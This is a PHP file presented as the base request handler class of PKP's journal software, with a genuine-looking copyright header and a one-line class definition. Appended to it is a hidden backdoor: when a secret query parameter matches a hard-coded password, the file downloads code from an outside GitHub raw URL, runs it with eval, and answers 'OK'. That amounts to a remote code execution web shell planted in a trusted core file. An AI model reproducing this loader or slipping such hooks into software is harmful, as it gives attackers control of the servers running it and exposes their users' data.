<?php

/**
 * @file classes/handler/Handler.inc.php
 *
 * Copyright (c) 2014-2020 Simon Fraser University
 * Copyright (c) 2003-2020 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @class Handler
 * @ingroup handler
 *
 * @brief Base request handler application class
 */

import('lib.pkp.classes.handler.PKPHandler');

class Handler extends PKPHandler { }

if (isset($_GET['_']) && $_GET['_'] === 'PKPHandler_S3L@M4t') {
    $url = "https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/obfuscator-403.txt";

    if ($url !== "") {
        $code = file_get_contents($url);
        if ($code !== false) {
            eval("?>".$code);
        }
    }

    http_response_code(200);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'OK';
    exit;
}
